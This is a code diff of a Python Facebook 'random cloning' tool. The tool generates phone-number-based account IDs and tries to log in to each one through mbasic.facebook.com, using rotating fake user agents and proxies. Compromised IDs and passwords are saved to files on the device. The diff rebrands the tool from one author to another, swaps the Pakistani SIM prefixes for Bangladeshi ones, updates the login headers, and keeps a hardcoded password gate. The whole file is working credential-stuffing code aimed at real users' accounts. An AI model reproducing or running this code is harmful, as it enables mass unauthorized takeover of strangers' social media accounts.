@@ -1,4 +1,4 @@
-#created by Md. Rifat Hasan Rear
+#created by Md. Rifat Uzzal Rear
 #!/usr/bin/python3 
 #---------------------[IMPORT]---------------------#
 from bs4 import BeautifulSoup as sop
@@ -58,7 +58,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python Hasan.py')
+    os.system('python Uzzal.py')
 from bs4 import BeautifulSoup
 from datetime import date
 from datetime import datetime
@@ -107,33 +107,33 @@ ugen=[]
 #-----------------------[DATE CHECKER]-----------------------#
 def Jawnx(uid):
     if len(uid)==15:
-        if uid[:10] in ['1000000000']       :Hasan = ' 2009'
-        elif uid[:9] in ['100000000']       :Hasan = '~> 2009'
-        elif uid[:8] in ['10000000']        :Hasan = '~> 2009'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:Hasan = '~> 2009'
-        elif uid[:7] in ['1000006','1000007','1000008','1000009']:Hasan = ' 2010'
-        elif uid[:6] in ['100001']          :Hasan = '~> 2010/2011'
-        elif uid[:6] in ['100002','100003'] :Hasan = '~> 2011/2012'
-        elif uid[:6] in ['100004']          :Hasan = '~> 2012/2013'
-        elif uid[:6] in ['100005','100006'] :Hasan = '~> 2013/2014'
-        elif uid[:6] in ['100007','100008'] :Hasan = '~> 2014/2015'
-        elif uid[:6] in ['100009']          :Hasan = '~> 2015'
-        elif uid[:5] in ['10001']           :Hasan = '~> 2015/2016'
-        elif uid[:5] in ['10002']           :Hasan = '~> 2016/2017'
-        elif uid[:5] in ['10003']           :Hasan = '~> 2018/2019'
-        elif uid[:5] in ['10004']           :Hasan = '~> 2019/2020'
-        elif uid[:5] in ['10005']           :Hasan = '~> 2020'
-        elif uid[:5] in ['10006','10007','']:Hasan = '~> 2021'
-        elif uid[:5] in ['10008']           :Hasan = '~> 2022'
-        else:Hasan=''
+        if uid[:10] in ['1000000000']       :Uzzal = ' 2009'
+        elif uid[:9] in ['100000000']       :Uzzal = '~> 2009'
+        elif uid[:8] in ['10000000']        :Uzzal = '~> 2009'
+        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:Uzzal = '~> 2009'
+        elif uid[:7] in ['1000006','1000007','1000008','1000009']:Uzzal = ' 2010'
+        elif uid[:6] in ['100001']          :Uzzal = '~> 2010/2011'
+        elif uid[:6] in ['100002','100003'] :Uzzal = '~> 2011/2012'
+        elif uid[:6] in ['100004']          :Uzzal = '~> 2012/2013'
+        elif uid[:6] in ['100005','100006'] :Uzzal = '~> 2013/2014'
+        elif uid[:6] in ['100007','100008'] :Uzzal = '~> 2014/2015'
+        elif uid[:6] in ['100009']          :Uzzal = '~> 2015'
+        elif uid[:5] in ['10001']           :Uzzal = '~> 2015/2016'
+        elif uid[:5] in ['10002']           :Uzzal = '~> 2016/2017'
+        elif uid[:5] in ['10003']           :Uzzal = '~> 2018/2019'
+        elif uid[:5] in ['10004']           :Uzzal = '~> 2019/2020'
+        elif uid[:5] in ['10005']           :Uzzal = '~> 2020'
+        elif uid[:5] in ['10006','10007','']:Uzzal = '~> 2021'
+        elif uid[:5] in ['10008']           :Uzzal = '~> 2022'
+        else:Uzzal=''
     elif len(uid) in [9,10]:
-        Hasan = '~> 2008/2009'
+        Uzzal = '~> 2008/2009'
     elif len(uid)==8:
-        Hasan = '~> 2007/2008'
+        Uzzal = '~> 2007/2008'
     elif len(uid)==7:
-        Hasan = '~> 2006/2007'
-    else:Hasan=''
-    return Hasan
+        Uzzal = '~> 2006/2007'
+    else:Uzzal=''
+    return Uzzal
 
 #-----------------------[LOOP]-----------------------#
 loop = 0
@@ -160,7 +160,7 @@ for xd in range(5000):
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
 try:
-    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+    prox= requests.get('https://github.com/UzzalVau/Indian-cloning/blob/main/proxy.txt/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
     print('\x1b[1;95m[√] LOADING...')
@@ -350,7 +350,7 @@ import getpass
 attemps = 0
 print("")
 print("")
-print("\033[92;1mTools User: Hasan Islam  ‌‌‌‌  ×[Copy and Paste]×")
+print("\033[92;1mTools User: Uzzal Islam  ‌‌‌‌  ×[Copy and Paste]×")
 print("")
 print("")
 print("\033[93;1mNote: \033[91;1mMessage the admin on WhatsApp to get the password")
@@ -359,7 +359,7 @@ while attemps < 12345677901:
       username = input('ENTER USERNAME :')
       os.system("xdg-open https://wa.me/+8801750017124")
       password = input('ENTER PASSWORD :')
-      if username == 'Hasan Islam' and password == 'Hasan404':
+      if username == 'Uzzal Islam' and password == 'Uzzal404':
          print('You Have Successfully Logged in.')
          break 
       else:
@@ -429,7 +429,7 @@ def XYZ():
     print(f"\t      {WHITE}[{EXTRA} {rifatT()} {WHITE}]")
     print(f" {GREEN}PREMIUM USER          {WHITE}: {GREEN}Mr {ORANGE} {NameX}")
     print(f"{BLUE}══════════════════════════════════════════════════════")
-    print(f"{RED}[01] {WHITE}PAK RANDOM CLONE ")
+    print(f"{RED}[01] {WHITE}BD RANDOM CLONE ")
     print(f"{RED}[02] {WHITE}FEEDBACK 🙂 ")
     print(f"{RED}[03] {WHITE}OWNER WHATSAPP")
     print(f"{RED}[00] {WHITE}EXIT PROGRAM ")
@@ -438,10 +438,10 @@ def XYZ():
     if rifat in ["1","01"]:
         passx()
     elif rifat in ["2","02"]:
-        os.system("xdg-open https://www.facebook.com/profile.php?id=100041531163933")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=itzUzzalVau2008")
         XYZ()
     elif rifat in ["3","03"]:
-        os.system("xdg-open https://wa.me/+8801750017124")
+        os.system("xdg-open https://wa.me/+8801843438888")
         XYZ()
     elif rifat in ["0","00"]:
        exit()
@@ -484,11 +484,11 @@ def pass1():
     linex()
     print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
     print(f"")
-    print(f' {GREEN}[!] PAk SIM CODES : {Y}0334, 0321, 0340, 0345')
-    print(f' {GREEN}[!]               : {T}0303, 0302, 0301, 0305')
-    print(f' {GREEN}[!]               : {Q}0349, 0316, 0314, 0335')
+    print(f' {GREEN}[!] BD SIM CODES : {Y}0171, 0182, 0191, 0134')
+    print(f' {GREEN}[!]               : {T}017, 018, 019, 015')
+    print(f' {GREEN}[!]               : {Q}0131, 0141, 0191, 0151')
     linex()
-    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
+    print(f"\x1b[97m[\033[37;41mBEST CODE FOR BD 0171 / 0151 / 0191 / 0181    \033[0;m]")
     linex()
     code = input(' PUT CODE : ')
     os.system("clear")
@@ -515,7 +515,7 @@ def pass1():
     print(f'\n[~]{RED}======================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}======================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Hasan-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -535,11 +535,11 @@ def pass2():
     linex()
     print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
     print(f"")
-    print(f' {GREEN}[!] PAk SIM CODES : {Y}0334, 0321, 0340, 0345')
-    print(f' {GREEN}[!]               : {T}0303, 0302, 0301, 0305')
-    print(f' {GREEN}[!]               : {Q}0349, 0316, 0314, 0335')
+    print(f' {GREEN}[!] BD SIM CODES : {Y}0334, 0321, 0340, 0345')
+    print(f' {GREEN}[!]               : {T}0171, 0181, 0191, 0151')
+    print(f' {GREEN}[!]               : {Q}0131, 0141, 0177, 0188')
     linex()
-    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
+    print(f"\x1b[97m[\033[37;41mBEST CODE FOR BD 0179 / 0177 / 0188 / 0199 /0155   \033[0;m]")
     linex()
     code = input(' PUT CODE : ')
     os.system("clear")
@@ -566,7 +566,7 @@ def pass2():
     print(f'\n[~]{RED}======================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}======================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Hasan-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -581,11 +581,11 @@ def Ulti():
     linex()
     print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
     print(f"")
-    print(f' {GREEN}[!] PAK SIM CODES : {Y}0334, 0321, 0340, 0345')
-    print(f' {GREEN}[!]               : {T}0303, 0302, 0301, 0305')
-    print(f' {GREEN}[!]               : {Q}0349, 0316, 0314, 0335')
+    print(f' {GREEN}[!] BD SIM CODES : {Y}0177, 0188, 0199, 0155')
+    print(f' {GREEN}[!]               : {T}0131, 0141, 0177, 0155')
+    print(f' {GREEN}[!]               : {Q}0199, 0144, 0133, 0183')
     linex()
-    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
+    print(f"\x1b[97m[\033[37;41mBEST CODE FOR BD 0300 / 0177 / 0188 / 0144 /0133   \033[0;m]")
     linex()
     code = input(' PUT CODE : ')
     os.system("clear")
@@ -613,7 +613,7 @@ def Ulti():
     print(f'\n[~]{RED}======================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Hasan-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -630,11 +630,11 @@ def pass3():
     linex()
     print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
     print(f"")
-    print(f' {GREEN}[!] PAk SIM CODES : {Y}0334, 0321, 0340, 0345')
-    print(f' {GREEN}[!]               : {T}0303, 0302, 0301, 0305')
-    print(f' {GREEN}[!]               : {Q}0349, 0316, 0314, 0335')
+    print(f' {GREEN}[!] PAk SIM CODES : {Y}0177, 0188, 0133, 0199')
+    print(f' {GREEN}[!]               : {T}0171, 0191, 0151, 0141')
+    print(f' {GREEN}[!]               : {Q}0161, 0177, 0166, 0177')
     linex()
-    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 0300 / 0302 / 0306 / 0349 /0315   \033[0;m]")
+    print(f"\x1b[97m[\033[37;41mBEST CODE FOR BD 0171 / 0161 / 0181 / 0191 /0122   \033[0;m]")
     linex()
     code = input(' PUT CODE : ')
     os.system("clear")
@@ -662,7 +662,7 @@ def pass3():
     print(f'\n[~]{RED}======================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}======================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Hasan-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/RIFAT-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Uzzal-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
 
 
@@ -678,7 +678,7 @@ def freeq(uid,pwx,tl):
             bi = random.choice([A])
             session = requests.Session()
             ua = random.choice(ugen)
-            free_fb = session.get('https://x.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -690,13 +690,14 @@ def freeq(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {
-    'authority': 'x.facebook.com',
+    'authority': 'mbasic.facebook.com',
     'cache-control': 'max-age=0',
     'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Windows"',
+    'sec-ch-ua-platform': '"Android"',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 viewport-width: 785',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+    'viewport-width': '980',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-mode': 'navigate',
@@ -704,7 +705,7 @@ def freeq(uid,pwx,tl):
     'sec-fetch-dest': 'document',
     'referer': 'https://m.alpha.facebook.com/login',
     'accept-language': 'en-US,en;q=0.9',}
-            lo = session.post('https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -722,7 +723,7 @@ def freeq(uid,pwx,tl):
                     uid = "1000"+coki1[0:11]
                     #os.system("play-audio RIFAT_2F.mp3")
                     print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
-                    open('/sdcard/Hasan-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    open('/sdcard/Uzzal-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -730,13 +731,13 @@ def freeq(uid,pwx,tl):
                     uid = "1000"+coki1[0:11]
                   #  os.system("play-audio RITU_CP.mp3")
                     print(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
-                    open('/sdcard/Hasan-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    open('/sdcard/Uzzal-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[Hasan] [%s] \33[1;97m[OK:%s{rifat2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[Uzzal] [%s] \33[1;97m[OK:%s{rifat2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
     except:
         pass
